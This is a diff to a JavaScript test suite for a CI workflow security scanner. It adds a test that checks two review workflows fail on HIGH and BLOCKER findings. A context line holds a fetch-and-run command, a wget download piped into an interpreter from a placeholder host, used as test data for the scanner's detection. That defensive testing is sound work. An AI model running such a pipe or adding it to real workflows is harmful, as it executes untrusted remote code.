@@ -313,3 +313,13 @@ test('Codex P1: unknown downloader pipe never silently becomes clean',()=>{
  const actual=inspectWorkflow(workflow('push','wget -qO- https://example.invalid/install | custom-interpreter'));
  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify(actual));
 });
+
+test('INTEGRATION: both trusted read-only review workflows fail on HIGH as well as BLOCKER',()=>{
+ const fs=require('node:fs'),path=require('node:path');
+ const independent=fs.readFileSync(path.resolve(__dirname,'../workflows/ultra-sentinel-independent-review.yml'),'utf8');
+ const automatic=fs.readFileSync(path.resolve(__dirname,'../workflows/ultra-sentinel-auto-review.yml'),'utf8');
+ for(const [label,workflow] of [['independent',independent],['automatic',automatic]]){
+  assert.match(workflow,/\.findings\.some\(f\s*=>\s*f\.severity\s*===\s*['\"]HIGH['\"]\s*\|\|\s*f\.severity\s*===\s*['\"]BLOCKER['\"]\)/,label+' must block HIGH');
+  assert.match(workflow,/core\.setFailed\(/,label+' must actually fail the run');
+ }
+});
